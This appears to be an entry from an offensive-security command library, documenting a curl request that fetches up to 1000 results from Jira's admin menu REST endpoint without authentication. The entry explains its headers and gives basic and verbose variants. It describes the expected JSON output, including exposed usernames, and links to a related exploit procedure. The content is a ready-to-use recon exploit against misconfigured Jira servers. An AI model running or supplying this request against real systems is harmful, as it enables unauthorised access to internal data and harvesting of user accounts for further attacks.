---
id: cmd-curl-jira-api-001
data: >-
  curl -X GET 'https://target.com/rest/menu/latest/admin?maxResults=1000' -H
  'Host: target.com' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H
  'Cache-Control: no-cache' -H 'sec-ch-ua-platform: "Mac OS"' -H
  'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors'
tags:
  - recon
  - api
  - jira
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:18.190Z'
verified: false
validated: true
submitted: true
---
# curl-jira-admin-api

## Command

```bash
curl -X GET 'https://target.com/rest/menu/latest/admin?maxResults=1000' -H 'Host: target.com' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'sec-ch-ua-platform: "Mac OS"' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors'
```

## Description

This command sends an unauthenticated GET request to the Jira admin menu API, exploiting lack of auth to retrieve sensitive JSON data including project categories, resolutions, and usernames. Use in reconnaissance against vulnerable Jira instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `https://target.com/rest/menu/latest/admin?maxResults=1000` | Target URL with param to fetch up to 1000 results | Yes |
| `-H 'Host: target.com'` | Sets the Host header to match target | Yes |
| `-H 'Connection: keep-alive'` | Maintains persistent connection | No |
| `-H 'Pragma: no-cache'` | Disables caching for fresh response | No |
| `-H 'Cache-Control: no-cache'` | Ensures no-cache behavior | No |
| `-H 'sec-ch-ua-platform: "Mac OS"'` | Mimics browser platform hint | No |
| `-H 'Sec-Fetch-Site: same-origin'` | Indicates same-origin fetch | No |
| `-H 'Sec-Fetch-Mode: cors'` | Specifies CORS mode | No |

## Examples

### Basic Usage

```bash
curl -X GET 'https://target.com/rest/menu/latest/admin?maxResults=1000' -H 'Host: target.com'
```

### Advanced Usage

Add verbose for debugging:

```bash
curl -v -X GET 'https://target.com/rest/menu/latest/admin?maxResults=1000' -H 'Host: target.com' -H 'User-Agent: Mozilla/5.0'
```

## Expected Output

JSON array like: {"weight":1,"id":"admin","items":[{"type":"project","name":"Project X","id":123}, {"type":"resolution","name":"Fixed"}]}. Includes usernames in user-related sections if exposed.

## Related

- [[Related Procedure: Exploit-Unauthenticated-Admin-Menu-API]]
